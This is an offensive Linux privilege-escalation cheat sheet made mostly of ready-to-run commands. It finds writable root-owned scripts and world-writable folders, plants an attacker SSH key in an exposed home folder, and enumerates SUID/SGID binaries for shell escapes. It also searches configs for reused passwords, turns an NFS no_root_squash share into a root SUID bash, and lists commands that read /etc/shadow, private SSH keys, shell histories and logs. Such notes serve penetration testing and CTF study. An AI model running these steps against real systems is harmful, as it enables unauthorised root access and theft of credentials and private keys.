# Files and Folders

## Writable Files and Folders

* If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges *when the script is run as root*.
```
find / -uid 0 -perm -u+x,o+w 2&>/dev/null
find / -xdev -user root -perm -u+W
```
  *xdev*, meaning not to recurse underneath mount points such as /proc and /sys


* Find files this user can execute
```
$ find [folder] -perm /u+x
```

* Find writable for nobody:
```
find / \( -type f -or -type d \) \( \( -user nobody -perm -u=w \) -or \( -group nobody -perm -g=w \) -or -perm -o=w \) -print`
```

* Find **world-writable**

  ```
  # World writable files directories
  find / -writable -type d 2>/dev/null
  find / -perm -222 -type d 2>/dev/null
  find / -perm -o w -type d 2>/dev/null     # world-executable folders
  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
  ```

* Usually these are **world-writable**
  ```
  /tmp
  /var/tmp
  /dev/shm
  /var/spool/vbox
  /var/spool/samba
  ```

* Find **world executable**

  ```
  # World executable folder
  find / -perm -o x -type d 2>/dev/null
  ```

* Which **configuration files** can be written in `/etc`?

  ```
  ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
  ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
  ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
  ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

  find /etc/ -readable -type f 2>/dev/null               # Anyone
  find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
  ```


## Writable home Folders

### Insert ssh key

* If I have access to a user's home folder, I can insert *MY* ssh key in there and ssh into machine with *MY* key:

* On attacker (MY) machine (if *I* don't already have a key)
```
$ ssh-keygen
```

* On writable host HOME folder:
```
$ mkdir [mounted_home]/.ssh
$ cat id_rsa.pub > [mounted_home]/.ssh/authorized_keys
```

* On attacker machine:
```
$ ssh -i id_rsa [user]@[host]
```
---


## SUID and GUID Misconfiguration

* See [GTFOBins](https://gtfobins.github.io/) for each app that can be used and how.

* When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.
* the system pretends that the person accessing the file is the owner of the passwd command, not the person who is running the command.

* setgid is essentially the same thing as setuid on a file. When someone runs the command, instead of accessing files as the group the person is a part of, the system pretends the person is a member of the group the file is owned by.

* For example, these are some programs that can be used to spawn a shell:
```
nmap
vim
less
more
bash  (is a shell)
sh    (is a shell)
```

* Find suid and guid files

  ```
  #Find SUID
  find / -perm -u=s -type f 2>/dev/null

  #Find GUID
  find / -perm -g=s -type f 2>/dev/null
  ```

* find files with **setuid**  
  `find / -perm -4000 -type f 2>/dev/null`  

  OR with **setgid**  
  `find / -perm -02000 -o -perm -04000 2>/dev/null`  
  OR  
  ```
  $ find / -perm -6000 -type f -exec ls -ld {} \; > setuid; echo done
  $ cat setuid
  ```

  ```
  find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
  find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
  find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
  find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID

  for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

  # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
  find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
  ```

* When custom scripts are found, run these to see if the output reveals anything.

* Custom scripts that use system binaries could be used to elevate privileges, or take advantage of adding malicious executables to the PATH, that are named the same as the system binary.


---
## Weak/reused/plaintext passwords

* Check file where webserver connect to database (config.php or similar)
```
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

* Check databases for admin passwords that might be reused
```sh
# Anything interesting the the mail?
/var/spool/mail
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
./LinEnum.sh -t -k password
```

---
## Unmounted filesystems

* Check for any unmounted filesystems, if any, try to mount again.
```sh
mount -l
cat /etc/fstab
````

### NFS Share
[External Link](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/ )

* First check if the target machine has any NFS shares
```sh
showmount -e 192.168.1.101
# OR using nmap
nmap -sV --script=nfs-showmount 192.168.1.101
```

* The `/etc/exports` file holds a record for each directory that you expect to share within a network machine. Each record describes how one directory or file is shared.

* An NFS system is considered weak or Misconfigured when the `no_root_squash` option is used. If `no_root_squash` is used, remote root users are able to change any file on the shared file system and leave applications infected by Trojans for other users to inadvertently execute.
```
/home   *(rw,no_root_squash)
```

* Mount the folder:
```sh
# mount -t nfs [ip_address]:/[directory_found_exported] /[local_mount_point]
mount -t nfs 192.168.1.101:/home /tmp/xxx
```

* Exploit
```sh
cd /tmp/xxx
cp /bin/bash .
chmod +s bash
ls -al bash
-rwsr-sr-x  1 root  root  11111240  May 24 07:31  bash
```
  Then when on the host, you can execute
  ```sh
  # on the victim host
  cd /home
  ./bash -p
  ```


---
## Linux Interesting Files and Folders

* See also: https://updatedlinux.wordpress.com/2011/05/12/list-of-important-files-and-directories-in-linux-redhatcentosfedora/
* Check for interesting information:

```

# Sensitive files on host
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

# Home folders
ls -ahlR /root/
ls -ahlR /home/

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

# Gold
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/


# Log Files
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

```
